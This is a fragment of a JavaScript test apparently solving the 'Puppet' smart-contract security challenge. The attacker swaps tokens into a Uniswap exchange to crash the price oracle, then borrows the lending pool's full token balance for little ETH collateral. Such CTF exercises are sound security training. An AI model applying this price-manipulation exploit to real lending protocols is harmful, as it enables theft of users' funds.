...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        const a = await this.uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), { gasLimit: 1e6 })
        console.log(a.div(1e6).div(1e6).div(1e4).toString())
        ...
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, blockTimestamp + 1000, { gasLimit: 1e6 }
        )

        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethers.utils.parseEther("34") })
    });
